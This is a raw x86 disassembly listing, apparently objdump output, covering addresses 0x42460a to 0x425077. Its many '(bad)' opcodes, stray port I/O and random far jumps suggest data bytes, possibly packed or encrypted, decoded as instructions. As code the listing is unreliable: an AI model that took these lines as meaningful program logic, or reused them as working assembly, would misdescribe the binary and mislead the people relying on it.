  42460a:	mov    eax,ds:0x200d900f
  42460f:	push   0x46
  424611:	xor    edx,DWORD PTR [ebx]
  424613:	popf   
  424614:	cmp    bl,BYTE PTR [edx-0xf]
  424617:	pop    ebx
  424618:	push   ebx
  424619:	cdq    
  42461a:	mov    ds:0x4839418f,al
  42461f:	sti    
  424620:	ja     0x42463b
  424622:	sti    
  424623:	mov    edx,0xa0fe271b
  424628:	gs dec esp
  42462a:	lahf   
  42462b:	mov    ecx,0x853621a8
  424630:	mov    esi,0x482b5bcc
  424635:	adc    cl,bh
  424637:	pushf  
  424638:	jecxz  0x424617
  42463a:	inc    ecx
  42463b:	out    dx,al
  42463c:	pop    ebx
  42463d:	or     DWORD PTR [esi+0x17cff0cb],0xffffffb6
  424644:	das    
  424645:	ret    0x5a88
  424648:	inc    ebx
  42464a:	test   al,0xaf
  42464c:	mov    ah,0x36
  42464e:	sbb    DWORD PTR [ebx],esp
  424650:	aad    0xeb
  424652:	and    BYTE PTR [ecx+0x2],cl
  424655:	pop    edi
  424656:	cdq    
  424657:	xlat   BYTE PTR ds:[ebx]
  424658:	push   esp
  424659:	pop    ss
  42465a:	cmp    DWORD PTR ds:0xf3930b2f,ebp
  424660:	sub    DWORD PTR [edx-0x43e557f8],0x71468d5b
  42466a:	or     DWORD PTR ds:0xf4d8bd21,0x5
  424671:	xor    ebx,DWORD PTR es:[ebp+0x16e0f467]
  424678:	sar    DWORD PTR [ebp-0x76785c15],0xf8
  42467f:	push   0x25
  424681:	mov    bl,0xd4
  424683:	xchg   edi,eax
  424684:	and    eax,edi
  424686:	addr16 nop
  424688:	ficomp WORD PTR [ebx+0x7]
  42468b:	adc    eax,0xa21de3b6
  424690:	sbb    DWORD PTR [eax],eax
	...
  4246f2:	add    BYTE PTR [eax],al
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ebx+0x4cfc51e7],bh
  424705:	test   DWORD PTR [ecx],eax
  424707:	add    BYTE PTR ds:0x73000001,al
  42470d:	jl     0x4246e6
  42470f:	push   ss
  424710:	call   0x172:0x4bbf9487
  424717:	out    0xdb,eax
  424719:	imul   ebp,DWORD PTR [edi+0x207ecedd],0x74
  424720:	pop    edi
  424721:	cli    
  424722:	push   esi
  424723:	push   0x16
  424725:	cmp    al,0xe3
  424727:	xor    BYTE PTR [eax],ah
  424729:	jp     0x42472c
  42472b:	aaa    
  42472c:	sbb    esi,0x5ad01fc0
  424732:	mov    ch,0x6b
  424734:	or     al,0x2b
  424736:	mov    ch,0x89
  424738:	(bad)  [ebx+0x668ce329]
  42473e:	mov    cl,0x4a
  424740:	or     DWORD PTR [ebx-0xd],ecx
  424743:	mov    dh,BYTE PTR [edi+0x1fcacd66]
  424749:	int3   
  42474a:	and    BYTE PTR ds:0xc08659d8,dh
  424750:	rcl    BYTE PTR [ebx+edi*4+0x6370d05e],1
  424757:	shl    BYTE PTR [edi],0xe
  42475a:	test   DWORD PTR ds:0xc3ffd5c9,esi
  424760:	xchg   DWORD PTR [eax+0x6c],edi
  424763:	xor    dh,bl
  424765:	xor    eax,DWORD PTR [ebx+0x55]
  424768:	xlat   BYTE PTR ds:[ebx]
  424769:	xchg   ecx,eax
  42476a:	or     edi,edx
  42476c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42476d:	xchg   ebx,eax
  42476e:	cmp    cl,BYTE PTR [edi-0x4c]
  424771:	sbb    dl,al
  424773:	or     BYTE PTR [esi+0x52],dh
  424776:	sub    BYTE PTR [ebx+0x17d3ead6],bh
  42477c:	clc    
  42477d:	push   edx
  42477e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42477f:	push   esp
  424780:	sub    edi,ebx
  424782:	mov    DWORD PTR [edi],ebx
  424784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424785:	loopne 0x424800
  424787:	xchg   ecx,eax
  424788:	out    dx,eax
  424789:	jmp    0x42477a
  42478b:	jle    0x8c631842
  424791:	xchg   ecx,eax
  424792:	scas   al,BYTE PTR es:[edi]
  424793:	pop    ebp
  424794:	jo     0x424724
  424796:	je     0x4247dc
  424798:	sub    bh,ch
  42479a:	cli    
  42479b:	mov    ah,0x5b
  42479d:	jecxz  0x4247b4
  42479f:	mov    bl,0xb3
  4247a1:	(bad)  
  4247a2:	push   ecx
  4247a3:	jns    0x4247cd
  4247a5:	sar    BYTE PTR [edi],0xc4
  4247a8:	dec    ebx
  4247a9:	xchg   ecx,eax
  4247aa:	sub    eax,0xb4eb86a0
  4247af:	xchg   esi,eax
  4247b0:	fidivr DWORD PTR ds:0xde8083fd
  4247b6:	cs pop eax
  4247b8:	jg     0x424820
  4247ba:	or     DWORD PTR [edx-0x1],esp
  4247bd:	adc    ebp,ecx
  4247bf:	mov    ds:0xd13b2475,al
  4247c4:	or     al,0x4f
  4247c6:	jno    0x424838
  4247c8:	ret    
  4247c9:	or     dh,BYTE PTR [eax+eiz*2]
  4247cc:	inc    ebx
  4247cd:	shl    DWORD PTR [ebp-0x29],cl
  4247d0:	aas    
  4247d1:	lea    edi,[ebp+0x18]
  4247d4:	cmp    BYTE PTR ds:0x58fce0f0,al
  4247da:	fistp  DWORD PTR ds:0x7253ecf5
  4247e0:	mov    esp,0xadc7874f
  4247e5:	add    ah,0x7b
  4247e8:	xchg   edi,eax
  4247e9:	lock mov WORD PTR [eax-0x4b5e9647],?
  4247f0:	mov    WORD PTR [edx],es
  4247f2:	adc    DWORD PTR [edi+0x4a],edx
  4247f5:	nop
  4247f6:	dec    BYTE PTR [eax]
  4247f8:	stos   BYTE PTR es:[edi],al
  4247f9:	xor    al,0x52
  4247fb:	out    0x6,al
  4247fd:	cld    
  4247fe:	fbld   TBYTE PTR [ecx+0x4472e567]
  424804:	rcl    esi,1
  424806:	imul   edx,DWORD PTR [ebp-0x603eb3fb],0xdd02a9c
  424810:	sbb    eax,DWORD PTR [eax]
	...
  424872:	add    BYTE PTR [eax],al
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424881:	std    
  424882:	and    bl,BYTE PTR [ecx+0x18651]
  424888:	add    eax,0xb2000001
  42488d:	sub    bh,BYTE PTR fs:[eax-0x3f]
  424891:	sub    DWORD PTR [edi+0x6dd66a5f],eax
  424897:	pop    edx
  424898:	mov    bh,0x5f
  42489a:	int3   
  42489b:	fcmovne st,st(1)
  42489d:	aam    0x2f
  42489f:	push   0x77
  4248a1:	cmc    
  4248a2:	mov    bl,0xc2
  4248a4:	mov    BYTE PTR [edi],dl
  4248a6:	cmp    eax,0x3d5803df
  4248ab:	scas   eax,DWORD PTR es:[edi]
  4248ac:	lahf   
  4248ad:	mov    ecx,es
  4248af:	test   al,0x70
  4248b1:	adc    edx,DWORD PTR [edi+0x231aa74c]
  4248b7:	out    dx,al
  4248b8:	and    eax,0xf5a98a0e
  4248bd:	stos   DWORD PTR es:[edi],eax
  4248be:	fsub   QWORD PTR [eax]
  4248c0:	inc    ebx
  4248c1:	sahf   
  4248c2:	mov    edx,DWORD PTR [edx]
  4248c4:	leave  
  4248c5:	retf   0x2ebb
  4248c8:	push   edx
  4248c9:	es sub ebp,0xb717d460
  4248d0:	aaa    
  4248d1:	mov    ds:0x2357a456,eax
  4248d6:	dec    ecx
  4248d7:	pop    edx
  4248d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248d9:	ins    DWORD PTR es:[edi],dx
  4248da:	push   cs
  4248db:	out    0xc5,eax
  4248dd:	inc    ecx
  4248de:	mov    ebx,0x7a788685
  4248e3:	test   al,0x3c
  4248e5:	push   0xfffffffb
  4248e7:	out    dx,eax
  4248e8:	daa    
  4248e9:	out    dx,al
  4248ea:	test   BYTE PTR [edi-0x67],0xec
  4248ee:	pop    es
  4248ef:	jecxz  0x424932
  4248f1:	out    0x28,eax
  4248f3:	dec    DWORD PTR [edi-0x4e400671]
  4248f9:	jge    0x4248cc
  4248fb:	aaa    
  4248fc:	pop    esp
  4248fd:	call   0xdf11:0x429718c5
  424904:	repz dec edx
  424906:	mov    edi,0x572e43c9
  42490b:	mov    al,ds:0x29f63d94
  424910:	loopne 0x42496b
  424912:	cld    
  424913:	push   esp
  424914:	pusha  
  424915:	mov    edi,0xefb9f79b
  42491a:	out    dx,al
  42491b:	add    eax,0x8171d1e
  424920:	pop    es
  424921:	xchg   ebx,eax
  424922:	es mov al,0x62
  424925:	sub    al,0x40
  424927:	aam    0x39
  424929:	lds    eax,FWORD PTR ds:0xfee7ef50
  42492f:	xor    eax,0x5c70cb4e
  424934:	lock imul DWORD PTR [ebx+edi*4+0x44f81e79]
  42493c:	pop    esp
  42493d:	imul   ebx,DWORD PTR [ebx+edx*8],0x169ae97c
  424944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424945:	xor    ebx,DWORD PTR [ebx+edx*1]
  424948:	jecxz  0x424917
  42494a:	mov    ebp,0xb7c34c00
  42494f:	push   eax
  424950:	outs   dx,BYTE PTR ds:[esi]
  424951:	xchg   ebp,eax
  424952:	and    al,cl
  424954:	imul   ecx,DWORD PTR [eax-0x7],0xc707bb77
  42495b:	add    dl,ch
  42495d:	jae    0x4248f7
  42495f:	push   ecx
  424960:	es push ebx
  424962:	pusha  
  424963:	inc    edx
  424964:	jg     0x42494f
  424966:	(bad)
  424969:	clc    
  42496a:	cmp    BYTE PTR [ebp+0x31],bl
  42496d:	cli    
  42496e:	add    esp,ebx
  424970:	in     eax,0xc5
  424972:	cmc    
  424973:	je     0x4249b3
  424975:	femms  
  424977:	and    al,0x80
  424979:	hlt    
  42497a:	sahf   
  42497b:	mov    eax,0x2927cc5e
  424980:	push   edx
  424981:	in     eax,0x47
  424983:	out    0x96,eax
  424985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424986:	jnp    0x4249b3
  424988:	fdivr  st,st(6)
  42498a:	mov    dh,0x3c
  42498c:	aad    0xce
  42498e:	and    eax,0x4fc9
	...
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    al,BYTE PTR [edx-0xb]
  424a02:	dec    ebp
  424a03:	push   ebp
  424a04:	push   esi
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x7000001,al
  424a0d:	test   DWORD PTR [ebx+0x35],0xb0a01adb
  424a14:	pop    ds
  424a15:	scas   eax,DWORD PTR es:[edi]
  424a16:	or     ebx,edi
  424a18:	mov    al,0x68
  424a1a:	imul   edi,eax,0xffffff8a
  424a1d:	jo     0x4249e3
  424a1f:	test   al,0xac
  424a21:	and    al,BYTE PTR [eax]
  424a23:	jg     0x4249ab
  424a25:	mov    bh,0x62
  424a27:	into   
  424a28:	sub    DWORD PTR [ecx-0x1b5a5468],esp
  424a2e:	inc    ecx
  424a2f:	jbe    0x424a53
  424a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a32:	jg     0x4249f8
  424a34:	out    dx,eax
  424a35:	adc    DWORD PTR [ecx+0x50535542],0x954883e5
  424a3f:	push   ds
  424a40:	aam    0xdf
  424a42:	sbb    esp,ecx
  424a44:	cmp    esi,DWORD PTR [eax-0xb3711b0]
  424a4a:	mov    bl,0xa7
  424a4c:	xor    edx,DWORD PTR [ebx-0x1ba602c6]
  424a52:	mov    dh,0x3b
  424a54:	in     al,0x61
  424a56:	push   ebp
  424a57:	jg     0x424ab4
  424a59:	sbb    al,0x10
  424a5b:	dec    ebp
  424a5c:	into   
  424a5d:	lods   eax,DWORD PTR ds:[esi]
  424a5e:	fstp   QWORD PTR [esi]
  424a60:	(bad)  
  424a62:	jle    0x424ac3
  424a64:	cmp    edi,esi
  424a66:	cmp    al,0x67
  424a68:	add    eax,0x57deb49
  424a6d:	add    eax,0xb8569bad
  424a72:	pavgw  mm6,QWORD PTR [eax+ebx*2]
  424a76:	jge    0x424ad5
  424a78:	mov    ecx,0x7744fe61
  424a7d:	jecxz  0x424a32
  424a7f:	push   gs
  424a81:	in     al,0x68
  424a83:	lods   eax,DWORD PTR ds:[esi]
  424a84:	mov    esi,DWORD PTR [ebx]
  424a86:	push   cs
  424a87:	test   al,0x4f
  424a89:	mov    ebp,0xddf58b50
  424a8e:	pop    eax
  424a8f:	xor    eax,DWORD PTR [ebp-0x3]
  424a92:	inc    edi
  424a93:	xchg   ebx,eax
  424a94:	sub    DWORD PTR [ecx+edx*1+0x33],ebp
  424a98:	xadd   esp,eax
  424a9b:	loop   0x424a43
  424a9d:	or     eax,0x2300e332
  424aa2:	daa    
  424aa3:	jmp    0x424ae5
  424aa5:	arpl   dx,ax
  424aa7:	lods   eax,DWORD PTR ds:[esi]
  424aa8:	test   al,0x60
  424aaa:	lods   al,BYTE PTR ds:[esi]
  424aab:	pop    ecx
  424aac:	sti    
  424aad:	ds xchg edi,eax
  424aaf:	cld    
  424ab0:	ja     0x424ad4
  424ab2:	stos   BYTE PTR es:[edi],al
  424ab3:	jecxz  0x424b02
  424ab5:	mov    ch,0x9a
  424ab7:	add    al,0x55
  424ab9:	bound  edi,QWORD PTR [eax+0x594e07c]
  424abf:	fidivr WORD PTR [edx-0x3541b760]
  424ac5:	push   ecx
  424ac6:	leave  
  424ac7:	fild   DWORD PTR [esp+edx*8]
  424aca:	pop    es
  424acb:	mov    ah,0x89
  424acd:	test   eax,0x55cfbcfc
  424ad2:	nop    edx
  424ad5:	aad    0x70
  424ad7:	xchg   DWORD PTR [eax+0x3a321407],eax
  424add:	mov    ds:0x10d3b2d0,eax
  424ae2:	add    BYTE PTR [edx],ch
  424ae4:	and    eax,0xf2ff78f6
  424ae9:	fstp   TBYTE PTR [eax+0x3b]
  424aec:	cmp    DWORD PTR [edi-0x742b6ea8],edi
  424af2:	inc    eax
  424af3:	jmp    0x424ad9
  424af5:	mov    ch,BYTE PTR [esi]
  424af7:	je     0x424aac
  424af9:	sbb    edi,DWORD PTR [ecx-0x32]
  424afc:	dec    esp
  424afd:	lds    edi,FWORD PTR [esi]
  424aff:	sar    eax,0x20
  424b02:	fmul   DWORD PTR [edi-0x15102607]
  424b08:	sub    BYTE PTR [edi-0x7074d105],ch
  424b0e:	mov    esi,0xb462
	...
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	add    eax,DWORD PTR [eax-0x5c]
  424b83:	mov    eax,ds:0x1885b
  424b88:	add    eax,0x3c000001
  424b8d:	mov    eax,ds:0x56a876a1
  424b92:	out    dx,al
  424b93:	add    BYTE PTR [esi],dh
  424b95:	sbb    DWORD PTR es:[edx],0xd05820fd
  424b9c:	stos   BYTE PTR es:[edi],al
  424b9d:	je     0x424be4
  424b9f:	dec    ecx
  424ba0:	repnz mov esp,0x263c97bf
  424ba6:	loop   0x424b33
  424ba8:	pop    esi
  424ba9:	jbe    0x424b2c
  424bab:	ja     0x424b60
  424bad:	sub    eax,0x63a58b75
  424bb2:	leave  
  424bb3:	imul   DWORD PTR [edx]
  424bb5:	pop    esi
  424bb6:	push   ds
  424bb7:	out    dx,al
  424bb8:	push   edx
  424bb9:	adc    ch,BYTE PTR [eax]
  424bbb:	cs jp  0x424beb
  424bbe:	sub    DWORD PTR [edx],0xee380117
  424bc4:	xlat   BYTE PTR ds:[ebx]
  424bc5:	jb     0x424c19
  424bc7:	pop    ds
  424bc8:	leave  
  424bc9:	xchg   BYTE PTR [edi-0x6f89842c],dh
  424bcf:	mov    edx,DWORD PTR [edx+0x1a]
  424bd2:	jl     0x424b92
  424bd4:	in     eax,0x4d
  424bd6:	(bad)  
  424bd7:	cmp    esi,ecx
  424bd9:	out    0x26,al
  424bdb:	cmp    eax,0x6bbdb7d7
  424be0:	mov    bh,0xfa
  424be2:	xchg   DWORD PTR [ecx+0x6b],ecx
  424be5:	aad    0xdc
  424be7:	jecxz  0x424c24
  424be9:	push   ebp
  424bea:	sbb    DWORD PTR [esp+eax*1],ebp
  424bed:	lods   eax,DWORD PTR ds:[esi]
  424bee:	jmp    0x72dc:0xf4264b0
  424bf5:	sub    al,0xa3
  424bf7:	sub    edx,DWORD PTR [esi+0x8861302]
  424bfd:	lock in eax,dx
  424bff:	or     DWORD PTR [ebx+eax*4-0x34],edi
  424c03:	stos   DWORD PTR es:[edi],eax
  424c04:	push   edx
  424c05:	(bad)  
  424c06:	pushf  
  424c07:	push   ecx
  424c08:	dec    edi
  424c09:	stos   DWORD PTR es:[edi],eax
  424c0a:	jnp    0x424baa
  424c0c:	mov    ebx,DWORD PTR [eax]
  424c0e:	push   cs
  424c0f:	mov    ch,0x29
  424c11:	mov    al,0x7d
  424c13:	fimul  DWORD PTR [ecx-0x389d36c9]
  424c19:	mov    esp,0x65302ede
  424c1e:	mov    esp,0x3dfb8ee7
  424c23:	adc    ebx,ebx
  424c25:	adc    ebp,ebx
  424c27:	inc    esp
  424c28:	mov    esp,0xc5d7aba6
  424c2d:	sub    cl,BYTE PTR [ebp+ebx*1+0x68e6f60d]
  424c34:	pop    esp
  424c35:	mov    ebx,DWORD PTR [ebx+0xb]
  424c38:	pushf  
  424c39:	xor    dh,bh
  424c3b:	test   DWORD PTR [edi],ecx
  424c3d:	sub    al,BYTE PTR [edi]
  424c3f:	fucomp st(1)
  424c41:	in     al,0x1d
  424c43:	call   0x8ef4:0xd3f3895e
  424c4a:	push   0xaa75dd56
  424c4f:	xlat   BYTE PTR ds:[ebx]
  424c50:	cmp    BYTE PTR [eax],ch
  424c52:	or     al,BYTE PTR [ebp+0x63]
  424c55:	lahf   
  424c56:	and    eax,DWORD PTR [ebx+0x58d43b8b]
  424c5c:	adc    bl,BYTE PTR [ebx-0x1]
  424c5f:	mov    ch,0xb6
  424c61:	xchg   esp,eax
  424c62:	(bad)  
  424c63:	jns    0x424ca0
  424c65:	adc    esp,edx
  424c67:	cmp    al,0x95
  424c69:	retf   0x4211
  424c6c:	xor    BYTE PTR [esi-0x15],0x34
  424c70:	jecxz  0x424c9d
  424c72:	jecxz  0x424c7e
  424c74:	sar    BYTE PTR [eax-0xf],0xc0
  424c78:	push   edx
  424c79:	xchg   dh,dh
  424c7b:	or     al,0x68
  424c7d:	loope  0x424c6c
  424c7f:	sub    DWORD PTR [edi+0x5b575e64],esp
  424c85:	dec    ebx
  424c86:	mov    bh,0x14
  424c88:	xchg   ecx,eax
  424c89:	inc    edi
  424c8a:	push   0x128bc2c0
  424c8f:	dec    ebx
  424c90:	inc    ebx
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	mov    ebx,DWORD PTR [ecx+0x5d]
  424d03:	pop    es
  424d04:	pusha  
  424d05:	mov    DWORD PTR [ecx],eax
  424d07:	add    BYTE PTR ds:0x83000001,al
  424d0d:	mov    ch,0x6
  424d0f:	xchg   cl,cl
  424d11:	int3   
  424d12:	dec    edi
  424d13:	mov    BYTE PTR [ebp+0x6],ah
  424d16:	test   esp,esi
  424d18:	adc    al,0x1d
  424d1a:	push   0xcf81cf2e
  424d1f:	cmp    eax,0xec6b760c
  424d24:	sbb    al,ch
  424d26:	or     al,0x4d
  424d28:	xor    dh,BYTE PTR [edx+0x7]
  424d2b:	and    al,bl
  424d2d:	jns    0x424d44
  424d2f:	js     0x424da0
  424d31:	mov    cl,BYTE PTR [ecx]
  424d33:	in     eax,0xc8
  424d35:	and    edx,ecx
  424d37:	data16 jo 0x424d0e
  424d3a:	push   ebp
  424d3b:	mov    ecx,DWORD PTR ds:0xd8f266f5
  424d41:	and    ebx,DWORD PTR [esi+0x41]
  424d44:	popf   
  424d45:	scas   eax,DWORD PTR es:[edi]
  424d46:	pop    eax
  424d47:	adc    DWORD PTR [ebx],ecx
  424d49:	push   ds
  424d4a:	ret    0x2f27
  424d4d:	xchg   DWORD PTR [esp+esi*4],edi
  424d50:	mov    ?,WORD PTR [ebp-0x6]
  424d53:	mov    BYTE PTR [ecx],cl
  424d55:	jns    0x424d7c
  424d57:	jp     0x424d68
  424d59:	call   0x37c2ad36
  424d5e:	sub    esi,ebx
  424d60:	xor    BYTE PTR [ebx+0xb170d59],cl
  424d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d67:	fst    QWORD PTR [edx+edx*8-0x60]
  424d6b:	test   BYTE PTR [ecx-0x70d96230],ch
  424d71:	jno    0x424deb
  424d73:	ins    DWORD PTR es:[edi],dx
  424d74:	pop    edi
  424d75:	sub    eax,0x4c52fc38
  424d7a:	and    DWORD PTR [edi-0x24],edx
  424d7d:	(bad)  
  424d7e:	mov    ah,0xeb
  424d80:	push   ecx
  424d81:	popf   
  424d82:	jb     0x424d52
  424d84:	ficom  DWORD PTR [ebx]
  424d86:	mov    cl,dh
  424d88:	sbb    al,0x6b
  424d8a:	fisub  WORD PTR [ebx]
  424d8c:	and    esp,edx
  424d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d8f:	imul   ebp,DWORD PTR [esp+eax*1+0x6ec27fae],0x1c
  424d97:	jg     0x424d8f
  424d99:	push   ebp
  424d9a:	xor    BYTE PTR [edi+0x57],dl
  424d9d:	xchg   ecx,eax
  424d9e:	(bad)  
  424da0:	mov    eax,ds:0x5779a6e3
  424da5:	fld    TBYTE PTR [edi]
  424da7:	jns    0x424de4
  424da9:	cmp    DWORD PTR [edi-0x4c087534],0xffffffd1
  424db0:	call   0x7f35:0xe26ef91
  424db7:	push   ecx
  424db8:	mov    eax,0x142cdfac
  424dbd:	cs mov esi,0x13497165
  424dc3:	out    0x14,eax
  424dc5:	cmp    al,BYTE PTR [ecx+0xf]
  424dc8:	das    
  424dc9:	pop    esp
  424dca:	xlat   BYTE PTR ds:[ebx]
  424dcb:	ins    BYTE PTR es:[edi],dx
  424dcc:	adc    DWORD PTR [esp+ecx*1-0x6c331318],0x62
  424dd4:	push   esi
  424dd5:	std    
  424dd6:	sbb    dh,BYTE PTR [eax+0x54926ccc]
  424ddc:	dec    dx
  424dde:	push   0x60e3fd83
  424de3:	inc    eax
  424de4:	mov    ch,0x2e
  424de6:	imul   ebp,DWORD PTR [edx],0x8093fa8d
  424dec:	push   ss
  424ded:	adc    ebp,DWORD PTR [edi]
  424def:	stc    
  424df0:	mov    eax,0x1b378873
  424df5:	psraw  mm0,mm3
  424df8:	pop    es
  424df9:	dec    ebp
  424dfa:	lods   eax,DWORD PTR ds:[esi]
  424dfb:	dec    ebx
  424dfc:	dec    edx
  424dfd:	jp     0x424e7a
  424dff:	mov    edx,DWORD PTR [edi]
  424e01:	repnz jmp 0x5225:0xba9dd05e
  424e09:	aad    0x8f
  424e0b:	sub    al,0x7c
  424e0d:	push   esp
  424e0e:	sbb    eax,0xa984
	...
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e42
  424e81:	push   esi
  424e82:	mov    bl,0xa0
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0xab000001,al
  424e8d:	into   
  424e8e:	and    ecx,DWORD PTR [esp+ebp*4]
  424e91:	push   ss
  424e92:	xor    BYTE PTR [edi],dl
  424e94:	inc    ebp
  424e95:	jp     0x424f09
  424e97:	stos   DWORD PTR es:[edi],eax
  424e98:	sti    
  424e99:	push   0xffffffcb
  424e9b:	cmp    ebx,DWORD PTR [edi-0x27]
  424e9e:	ret    0x9fee
  424ea1:	sub    DWORD PTR [ebx],edx
  424ea3:	jecxz  0x424e48
  424ea5:	scas   eax,DWORD PTR es:[edi]
  424ea6:	inc    ebx
  424ea7:	cmp    DWORD PTR [eax+eax*2],ecx
  424eaa:	popa   
  424eab:	ins    BYTE PTR es:[edi],dx
  424eac:	sbb    eax,0xebed3c63
  424eb1:	pop    edi
  424eb2:	mov    ds:0x54082a63,al
  424eb7:	iret   
  424eb8:	mov    ebp,0x470c866f
  424ebd:	sar    BYTE PTR [ebx],0xae
  424ec0:	inc    esi
  424ec1:	pop    ebp
  424ec2:	lods   eax,DWORD PTR ds:[esi]
  424ec3:	mov    edi,0xe2e5c353
  424ec8:	std    
  424ec9:	loope  0x424efc
  424ecb:	addr16 pop es
  424ecd:	sahf   
  424ece:	xor    eax,0xbe4577f7
  424ed3:	fimul  DWORD PTR [ecx]
  424ed5:	scas   eax,DWORD PTR es:[edi]
  424ed6:	inc    ebp
  424ed7:	jmp    0x1b19fa8f
  424edc:	dec    esi
  424edd:	retf   0x48c6
  424ee0:	push   0xae85db7
  424ee5:	push   esp
  424ee6:	jmp    0x73ea2bab
  424eeb:	fbstp  TBYTE PTR [eax-0x46]
  424eee:	ja     0x424f60
  424ef0:	pop    ss
  424ef1:	pshufw mm3,QWORD PTR [ebx+0x8],0xaa
  424ef6:	int3   
  424ef7:	xchg   edi,eax
  424ef8:	scas   eax,DWORD PTR es:[edi]
  424ef9:	das    
  424efa:	mov    cl,0xda
  424efc:	popa   
  424efd:	fsubr  QWORD PTR ds:0xd5d68e35
  424f03:	jae    0x424e8c
  424f05:	and    cl,BYTE PTR [edi-0x61dce32e]
  424f0b:	out    0xd,eax
  424f0d:	dec    esp
  424f0e:	xor    al,0xee
  424f10:	and    edi,edi
  424f12:	sbb    DWORD PTR [esi+0x65],ecx
  424f15:	pop    ebp
  424f16:	sbb    DWORD PTR [eax-0x51d9feb3],eax
  424f1c:	inc    eax
  424f1d:	sbb    DWORD PTR [edx-0x74c8ff59],edi
  424f23:	sub    ebp,DWORD PTR [edi]
  424f25:	xchg   esp,eax
  424f26:	sbb    al,0x6a
  424f28:	pop    ebp
  424f29:	pop    edi
  424f2a:	das    
  424f2b:	mov    bh,0xed
  424f2d:	iret   
  424f2e:	mov    ebp,0xc2bce7e0
  424f33:	adc    DWORD PTR [eax],edi
  424f35:	(bad)  
  424f36:	pusha  
  424f37:	outs   dx,DWORD PTR ds:[esi]
  424f38:	jle    0x424ed4
  424f3a:	xor    ebp,esi
  424f3c:	mov    ch,0xe4
  424f3e:	icebp  
  424f3f:	sbb    DWORD PTR [edx+0x44],ebp
  424f42:	(bad)  
  424f43:	mov    DWORD PTR [edi-0xf538506],ecx
  424f49:	sbb    BYTE PTR [edi+0x77],0xe3
  424f4d:	and    esi,DWORD PTR [esi+ebp*1]
  424f50:	aam    0x70
  424f52:	fnsave [eax+0x13]
  424f55:	add    eax,ebp
  424f57:	jmp    0x5c655537
  424f5c:	adc    bh,BYTE PTR [eax+0x3d2508a6]
  424f62:	pop    edx
  424f63:	(bad)  
  424f64:	in     al,0xa3
  424f66:	test   al,0x7a
  424f68:	js     0x424fc1
  424f6a:	retf   0xb25c
  424f6d:	adc    ebp,ebx
  424f6f:	and    bh,BYTE PTR [eax-0x63]
  424f72:	out    dx,eax
  424f73:	test   DWORD PTR [ebp-0x4316d992],esp
  424f79:	in     eax,dx
  424f7a:	leave  
  424f7b:	inc    ebx
  424f7c:	fldcw  WORD PTR [edx-0x5c]
  424f7f:	xchg   edi,eax
  424f80:	ja     0x424f3b
  424f82:	lock call 0x9ffc:0x47a43b74
  424f8a:	sbb    al,0xd9
  424f8c:	sbb    DWORD PTR [edi+0x61],ebp
  424f8f:	cld    
  424f90:	retf   0x0
	...
  424ff3:	add    BYTE PTR [ebx+0x16],cl
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	sub    esp,eax
  425002:	test   al,0x84
  425004:	push   0xffffff8b
  425006:	add    DWORD PTR [eax],eax
  425008:	add    eax,0x6a000001
  42500d:	mov    ecx,0x2cc6d8d8
  425012:	ss std 
  425014:	sub    ebp,DWORD PTR [edx+eax*1]
  425017:	fcomp  DWORD PTR [eax-0x5f166a3e]
  42501d:	jmp    0x425092
  42501f:	sub    BYTE PTR [eax-0x5f],cl
  425022:	xchg   edx,eax
  425023:	mov    cl,0x81
  425025:	jle    0x42502d
  425027:	lds    ebp,FWORD PTR [ebx]
  425029:	and    al,BYTE PTR [ebx]
  42502b:	inc    edx
  42502c:	arpl   WORD PTR [eax],bx
  42502e:	out    0xdb,al
  425030:	clc    
  425031:	imul   edx,DWORD PTR [ebp-0x5e330038],0xaa391bdf
  42503b:	mov    al,ds:0xccf7f9eb
  425040:	inc    esi
  425041:	scas   eax,DWORD PTR es:[edi]
  425042:	ror    BYTE PTR [eax+0x65f7d5ed],1
  425048:	mov    BYTE PTR [edx-0x15],dh
  42504b:	repnz test eax,0xbe723a67
  425051:	pusha  
  425052:	jmp    0x42f3:0x73016363
  425059:	imul   edx,DWORD PTR [esi+0x2d],0x966e5657
  425060:	pop    esi
  425061:	pushf  
  425062:	and    ebx,eax
  425064:	scas   eax,DWORD PTR es:[edi]
  425065:	xor    bh,BYTE PTR [eax+0xf]
  425068:	push   0x92805d7c
  42506d:	xor    edx,DWORD PTR [edi+edx*2+0x6e]
  425071:	sbb    eax,0xe55e20
  425076:	pop    eax
  425077:	mov    eax,ds:0x3be7543d
